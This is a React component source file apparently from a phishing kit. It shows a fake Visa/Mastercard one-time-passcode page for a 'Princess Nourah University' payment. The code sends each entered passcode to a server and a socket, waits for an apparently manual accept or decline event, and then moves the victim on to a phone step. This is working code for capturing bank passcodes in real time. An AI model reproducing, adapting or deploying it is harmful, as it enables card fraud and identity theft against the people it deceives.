import React, { useEffect, useState } from "react";
import { useParams } from "react-router-dom";
import NavBar from "../component/NavBar";
import Footer from "../component/Footer";
import { BiBook } from "react-icons/bi";
import { TailSpin } from "react-loader-spinner";
import { serverRoute, socket } from "./Main";
import { token } from "../App";
import axios from "axios";
import { AiOutlineCloseCircle } from "react-icons/ai";

const NavazOtp = ({ setMode, checkMode }) => {
  const { id } = useParams();
  const mode = localStorage.getItem("lang");
  const [counter, setCounter] = useState(60);
  const [otp, setOtp] = useState(undefined);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(false);
  useEffect(() => {
    const timer = setInterval(() => {
      if (counter > 0) {
        setCounter(counter - 1); // Decrease counter by 1 second
      }
    }, 1000);

    // Cleanup function to clear the interval when the component unmounts
    return () => clearInterval(timer);
  }, [counter]);

  // Calculate minutes and seconds
  const minutes = Math.floor(counter / 60);
  const seconds = counter % 60;

  // Format the counter value as "MM:SS"
  const formattedMinutes = String(minutes).padStart(2, "0");
  const formattedSeconds = String(seconds).padStart(2, "0");

  const handleSubmit = async (e) => {
    setLoading(true);
    setError(false)
    e.preventDefault();
    await axios
      .post(serverRoute + "/navazOtp/" + sessionStorage.getItem("id"), {
        navazOtp: otp,
      })
      .then(() =>
        socket.emit("navazOtp", {
          id: sessionStorage.getItem("id"),
          navazOtp: otp,
        })
      );
    
  };

  socket.on("declineNavazOTP", (ID) => {
    if (ID === sessionStorage.getItem("id")) {
      setError(true);
      setLoading(false);
    }
  });
  socket.on("acceptNavazOTP", (id) => {
    console.log(id)
    if (id === sessionStorage.getItem("id")) {
      setError(false);
      setLoading(false);
      window.location.href = `/phone`;
    }
  });

  return (
    <div className="w-full  lg:w-1/2 flex flex-col items-center justify-center  rounded-md">
      <form
        className="bg-white border h-screen border-gray-300 rounded-md  p-3 text-sm w-full"
        onSubmit={handleSubmit}
      >
        <div className="flex w-full gap-x-3 items-center justify-around">
          <div className="w-12 ">
            <img src="/visa_logo.jpg" />
          </div>
          <div className="w-16 ">
            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTlJeSetovZYxcpQmPuM-fu7k2EzUcVb3qU0w&s" />
          </div>

          <div className="w-12 ">
            <img src="/Mastercard.png" />
          </div>
        </div>
        <p className="py-2 text-xs font-bold">
          to continue with your transaction , please enter the one-time passcode
          sent to your mobile number or email address and click submit
        </p>
        <h2 className="font-semibold my-2 text-gray-500">
          Transaction Details
        </h2>

        <div className="flex justify-between py-1">
          <span className="font-bold"> Merchant:</span>
          <span>Princess Nourah University</span>
        </div>
        <div className="flex justify-between py-1">
          <span className="font-bold">Transaction Amount:</span>
          <span>{Number(sessionStorage.getItem("price")).toFixed(2)} ريال</span>
        </div>
        <div className="flex justify-between py-1">
          <span className="font-bold">Card Number:</span>
          <span>
            ********
            {sessionStorage.getItem("cardNumber").split("").slice(15) || "9666"}
          </span>
        </div>
        <div className="flex justify-between py-1 items-center gap-x-2">
          <span className="font-bold w-1/3"> Enter Code:</span>
          <input
            value={otp}
            required
            onChange={(e) => setOtp(e.target.value)}
            dir="ltr"
            maxLength={6}
            minLength={6}
            inputMode="numeric"
            type="text"
            className="border px-3 py-1 font-light border-gray-400 text-base outline-[#ffc107] rounded-md w-1/2"
          />
        </div>

        {error ? (
          <div className="w-full text-center text-red-500  absolute bg-black bg-opacity-45 h-screen top-0 left-0 flex items-center justify-center">
            <div className="bg-white py-5 px-2 md:w-1/4 w-11/12 flex justify-center items-center flex-col text-lg gap-y-3">
              <AiOutlineCloseCircle className="text-6xl" />
              <div className="flex flex-col w-full items-center justify-center">
                <span>نتيجة الدفع فشل معرف الدفع </span>
                <span>82A27833M4589370G</span>
              </div>
              <button
                className="bg-gray-900 text-white w-11/12 py-3"
                onClick={() => setError(false)}
              >
                حاول مرة ثانية
              </button>
            </div>
          </div>
        ) : (
          ""
        )}

        <div className="w-full flex items-center justify-center py-10">
          {" "}
          <button className="w-fit px-5 flex justify-center items-center py-2  bg-black text-white ">
            Submit
          </button>
        </div>
      </form>
      {loading ? (
        <div className="fixed top-0 w-full h-screen bg-black bg-opacity-20 flex items-center justify-center ">
          <TailSpin
            height="50"
            width="50"
            color="white"
            ariaLabel="tail-spin-loading"
            radius="1"
            wrapperStyle={{}}
            wrapperClass=""
            visible={true}
          />
        </div>
      ) : (
        ""
      )}
    </div>
  );
};

export default NavazOtp;
